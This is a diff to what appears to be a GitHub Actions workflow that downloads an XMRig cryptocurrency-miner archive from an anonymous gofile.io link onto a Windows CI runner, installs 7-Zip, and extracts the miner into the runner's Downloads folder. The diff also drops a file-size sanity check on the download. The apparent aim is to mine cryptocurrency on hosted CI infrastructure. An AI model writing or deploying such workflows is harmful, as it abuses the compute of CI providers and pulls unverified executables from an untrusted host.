@@ -13,21 +13,21 @@ jobs:
       - name: Download xmrig RAR File
         run: |
           Invoke-WebRequest -Uri "https://gofile.io/d/Jym2yJ" -OutFile "xmrig-6.21.3-msvc-win64.rar"
-
-      - name: Verify Download
-        run: |
+          
+          # Verify the downloaded file
           $fileSize = (Get-Item "xmrig-6.21.3-msvc-win64.rar").length
-          if ($fileSize -lt 10000) { # File size is less than 10 KB, which is suspiciously small
-            Write-Host "Downloaded file size is unexpectedly small. The file may not be a valid RAR archive."
-            exit 1
-          }
+          Write-Host "Downloaded file size: $fileSize bytes"
 
       - name: Install 7-Zip
         run: choco install -y 7zip
 
+      - name: Check 7-Zip Installation
+        run: |
+          & 'C:\Program Files\7-Zip\7z.exe' -version
+
       - name: Extract xmrig RAR File to Downloads
         run: |
-          & 'C:\Program Files\7-Zip\7z.exe' x xmrig-6.21.3-msvc-win64.rar -oC:\Users\runneradmin\Downloads
+          & 'C:\Program Files\7-Zip\7z.exe' x xmrig-6.21.3-msvc-win64.rar -oC:\Users\runneradmin\Downloads -y
 
       - name: Downloading & Installing Essentials
         run: |
